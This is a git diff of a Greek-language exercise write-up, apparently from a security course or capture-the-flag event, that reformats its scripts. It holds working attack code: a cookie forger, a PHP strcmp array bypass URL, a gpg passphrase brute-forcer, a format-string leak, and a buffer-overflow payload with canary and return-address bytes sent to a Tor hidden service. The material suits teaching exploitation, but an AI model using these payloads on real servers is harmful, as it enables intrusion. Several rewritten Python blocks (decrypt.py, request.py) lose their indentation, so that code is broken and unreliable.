@@ -15,37 +15,39 @@
 Παρατηρήσαμε πως το cookie ηταν ένα string της μορφής base64(number:sha256(number)) οπότε βάζοντας στο number οτιδήποτε, μπορούσε να τυπωθεί στη σελίδα κάτω από το visitor number. Έτσι, φτιάξαμε ένα script (cookie.py) στο οποίο δίναμε την είσοδο που θέλαμε και υπολόγιζε το αντίστοιχο cookie.
 
 **cookie.py:**
+```python
+from hashlib import sha256
+from base64 import b64encode
 
-    from hashlib import sha256
-    from base64 import b64encode
-    
-    print("Give input")
-    x = input()
-    y = sha256(x.encode())
-    y = y.hexdigest()
-    final = x+":"+y
-    encoded = b64encode(final.encode('ascii'))
-    print(encoded.decode('ascii'))
+print("Give input")
+x = input()
+y = sha256(x.encode())
+y = y.hexdigest()
+final = x+":"+y
+encoded = b64encode(final.encode('ascii'))
+print(encoded.decode('ascii'))
+```
 
 ### Personal YS13 website
 Μέσω του html κώδικα της φόρμας εισόδου, είδαμε ότι έκανε GET request στο access.php. 
 Αφού επιτρέπεται η είσοδος στα .phps αρχεία δοκιμάσαμε να μπούμε στο /access.phps και τα καταφέραμε ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.phps ). Είχαμε πλέον πρόσβαση στον κώδικα της access.php. Tο περιεχόμενο της μεταβλητής **$desired** το υπολογίσαμε μέσω script που φτιάξαμε (desired.py)
 
 **desired.py:**
-
-    number = 7
-    p = 1
-    mult = 0
-    counter = 0
-    while  1:
-	    mult = p*number
-	    if (str(mult)).count('7') != 0: 
-		    counter += 1    
-		    print(str(counter) + ": " + str(mult))    
-	    if counter == 48:    
-		    print(mult)    
-		    break    
-	    p += 1
+```python
+number = 7
+p = 1
+mult = 0
+counter = 0
+while  1:
+    mult = p*number
+    if (str(mult)).count('7') != 0: 
+	    counter += 1    
+	    print(str(counter) + ": " + str(mult))    
+    if counter == 48:    
+	    print(mult)    
+	    break    
+    p += 1
+```
 
 και μας έβγαλε τον αριθμό **1337**, αλλά έπρεπε το μέγεθος του **$desired** να είναι 7, οπότε βάλαμε για username τον αριθμό **0001337**, ο οποίος ήταν και ο σωστός. Για το password ψάξαμε αν μπορούμε να διαπεράσουμε την **strcmp** της php. Ψάχνοντας στο google, βρήκαμε αυτό το [άρθρο](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016) . Στείλαμε το password σαν array και η strcmp μας γύρισε NULL αντί για error. Στην php ισχύει ότι NULL == 0, οπότε διαπεράσαμε τη συνθήκη της if. ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.php?user=0001337&password[]=%22%22 ). Φτάσαμε στο μήνυμα **"Hi! You can find my blog posts at directory: /blogposts7589109238!"**.  Μπήκαμε στα blog posts ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238 ) και κάναμε access τον φάκελο που περιέχει τα post ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/ ). 
 
@@ -59,33 +61,35 @@
 
 
 **decrypt.py:**
+```python
+import hashlib
+import os
 
-    import hashlib
-    import os
-   
-    def encrypt_string(hash_string):
-        sha_signature = \
-            hashlib.sha256(hash_string.encode()).hexdigest()
-        return sha_signature
-    
-    for y in range(1, 12):
-        for i in range(1, 31):
-            x = "2020-" + "{:02d}".format(y) + "-" + "{:02d}".format(i) + " raccoon"
-            print(x)
-            sha_signature = encrypt_string(x)
-            cmd1 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/firefox.log.gz.gpg'
-            cmd2 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/signal.log.gpg'
-            print(cmd1)
-            os.system(cmd1)
-            os.system(cmd2)
+def encrypt_string(hash_string):
+sha_signature = \
+    hashlib.sha256(hash_string.encode()).hexdigest()
+return sha_signature
+
+for y in range(1, 12):
+for i in range(1, 31):
+    x = "2020-" + "{:02d}".format(y) + "-" + "{:02d}".format(i) + " raccoon"
+    print(x)
+    sha_signature = encrypt_string(x)
+    cmd1 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/firefox.log.gz.gpg'
+    cmd2 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/signal.log.gpg'
+    print(cmd1)
+    os.system(cmd1)
+    os.system(cmd2)
+```
 
 Κάναμε decrypt τα αρχεία.
 
  Στο **firefox.log** τρέξαμε ένα bash script(remove.sh)
 
 **remove.sh:**
-
-    grep -v "https://en.wikipedia.org/wiki/The_Conversation" firefox.log > out.txt
+```bash
+grep -v "https://en.wikipedia.org/wiki/The_Conversation" firefox.log > out.txt
+```
 
  για να φύγουν όλα τα link του wikipedia, οπότε μας έμεινε το link του github( https://github.com/asn-d6/tor/ ). Μπήκαμε και είδαμε το τελευταίο commit που είχε κάνει ο κύριος **George Kadianakis** . Το link ήταν το: [https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f](https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f) . 
 Μετά μπήκαμε στο **signal.log** και πήραμε τον κωδικό και αντικαταστήσαμε τον κωδικό του τελευταίου commit στο παραπάνω url με αυτόν που πήραμε από το signal.log ( [https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97](https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97) ). Έτσι φτάσαμε στις οδηγίες για την εύρεση των συντεταγμένων όπου για < team name > βάλαμε το όνομα της ομάδας μας "hackerz". Ετσι βρήκαμε τις συντεταγμένες.   
@@ -101,22 +105,23 @@
 Φτιάξαμε ένα script που μας έφτιαχνε το input με όσα %08x θέλαμε και έτρεχε το δοκίμαζε(input.py).
 
 **input.py:**
+```python
+import os
 
-    import os
-    
-    from base64 import b64encode    
-    x =  '%08x '    
-    baseInput =  "%08x "     
-    
-    for i in  range(0, 5):    
-	    baseInput = baseInput + x    
-    baseInput +=  "%s:lalala"    
-    encoded = b64encode(baseInput.encode('ascii'))
-    print(baseInput)    
-    curl =  "curl -I 'http://127.0.0.1:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic "  + encoded.decode('ascii') +"'"    
-    print(curl)    
-    os.system(curl)    
-    print('\n\n')
+from base64 import b64encode    
+x =  '%08x '    
+baseInput =  "%08x "     
+
+for i in  range(0, 5):    
+    baseInput = baseInput + x    
+baseInput +=  "%s:lalala"    
+encoded = b64encode(baseInput.encode('ascii'))
+print(baseInput)    
+curl =  "curl -I 'http://127.0.0.1:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic "  + encoded.decode('ascii') +"'"    
+print(curl)    
+os.system(curl)    
+print('\n\n')
+```    
 
 Μετά από μερικές προσπάθειες βρήκαμε τα στοιχεία του πρώτου χρήστη (που ήταν της μορφής **name:md5(password)**) που βρίσκονταν στο αρχείο **passwd** . Μεταφέραμε ακριβώς το ίδιο input (**%08x %08x %08x %08x %08x %08x %s**) στο server της άσκησης και το output ήταν: 
 
@@ -154,46 +159,48 @@
 
 Στη συνέχεια τυπώσαμε το frame της check_auth + την επόμενη διεύθυνση (saved $eip) από τον remote server, οπότε είχαμε το canary, την αντίστοιχη διεύθυνση της σταθερής διεύθυνσης που θέλαμε, τον saved $ebp και τον saved $eip, βρήκαμε και τον αντίστοιχο local saved $eip και τον αφαιρέσαμε από τον saved $eip του remote server, έτσι είχαμε το offset ανάμεσα στον local server και στον remote server. Προσθέσαμε αυτό το offset στην διεύθυνση της εντολής **<serve_ultimate+18>** και βρήκαμε την διεύθυνσή της στο remote server. Τέλος σχεδιάσαμε το input, το οποίο ήταν της μορφής:
 
-    'Α' * 100 + Canary + Constant address * 2 + Saved $ebp + <serve_ultimate+18> address
+> 'Α' * 100 + Canary + Constant address * 2 + Saved $ebp + <serve_ultimate+18> address
 
 Με αυτό το input, καταφέραμε να κάνουμε το exploit.
 
 Για να κάνουμε τις δοκιμές στον remote server, τρέξαμε την εντολή socat:
-
-    socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:4tpgiulwmoz4sphv.onion:80,socksport=9150
+```bash
+socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:4tpgiulwmoz4sphv.onion:80,socksport=9150
+```
 
 εχοντας ανοικτό το tor service και στην συνέχεια εκτελέσαμε το script request.py για να κάνουμε το request.
 
 **request.py:**
+```python
+import requests
 
-    import requests
-    
-    headers = {
-        'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'http://127.0.0.1:8000',
-        'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
-        'Connection': 'keep-alive',
-        'Referer': 'http://127.0.0.1:8000/',
-        'Upgrade-Insecure-Requests': '1',
-    }
-    
-    #canary = i.to_bytes(4, byteorder='little')
-    data = b'A' * 100               # <-- buffer
-    data += b'\x00\xe2\x4c\xe7'     # <-- canary
-    data += b'\x00\x70\x5c\x56'     # <-- canary
-    data += b'\x00\x70\x5c\x56'     # <-- canary
-    data += b'\x78\x58\x8e\xff'     # <-- saved $ebp
-    data += b'\x6d\x49\x5c\x56'     # <-- saved $eip
-    try:
-        response = requests.post('http://127.0.0.1:8000/ultimate.html', headers=headers, data=data)
-        status_code = response.status_code
-        print("status_code = [" + str(status_code) + "]")
-        print("text = [" + response.text+ "]")
-    except requests.exceptions.RequestException as e:
-        print(e)  
+headers = {
+'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+'Accept-Language': 'en-US,en;q=0.5',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Origin': 'http://127.0.0.1:8000',
+'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
+'Connection': 'keep-alive',
+'Referer': 'http://127.0.0.1:8000/',
+'Upgrade-Insecure-Requests': '1',
+}
+
+#canary = i.to_bytes(4, byteorder='little')
+data = b'A' * 100               # <-- buffer
+data += b'\x00\xe2\x4c\xe7'     # <-- canary
+data += b'\x00\x70\x5c\x56'     # <-- canary
+data += b'\x00\x70\x5c\x56'     # <-- canary
+data += b'\x78\x58\x8e\xff'     # <-- saved $ebp
+data += b'\x6d\x49\x5c\x56'     # <-- saved $eip
+try:
+response = requests.post('http://127.0.0.1:8000/ultimate.html', headers=headers, data=data)
+status_code = response.status_code
+print("status_code = [" + str(status_code) + "]")
+print("text = [" + response.text+ "]")
+except requests.exceptions.RequestException as e:
+print(e)
+```
 Response:
 
  > Results:
@@ -208,26 +215,27 @@ Response:
 
 
 **debug.sh:**
+```bash
+#!/bin/sh
+make
 
-    #!/bin/sh
-    make
-    
-    PID=ps -eaf | grep picoserver | grep -v grep | awk '{print $2}'
-    
-    kill -9 $PID
-    
-    gdb\
-     -ex 'b httpd.c:58'\
-     -ex 'b main.c:179'\
-     -ex 'b main.c:181'\
-     -ex 'b main.c:194'\
-     -ex 'b main.c:197'\
-     -ex 'r'\
-     -ex 'set follow-fork-mode child'\
-     -ex 'c'\
-     -ex 'x/39xw $sp'\
-     -ex 'x/a $ebp + 4'\
-     ./picoserver
+PID=ps -eaf | grep picoserver | grep -v grep | awk '{print $2}'
+
+kill -9 $PID
+
+gdb\
+-ex 'b httpd.c:58'\
+-ex 'b main.c:179'\
+-ex 'b main.c:181'\
+-ex 'b main.c:194'\
+-ex 'b main.c:197'\
+-ex 'r'\
+-ex 'set follow-fork-mode child'\
+-ex 'c'\
+-ex 'x/39xw $sp'\
+-ex 'x/a $ebp + 4'\
+./picoserver
+```
 
 **Χρήσιμες εντολές gdb:**
 Υπολογισμός του offset της διεύθυνσης του remote server σε σχέση με την διεύθυνση του local server:
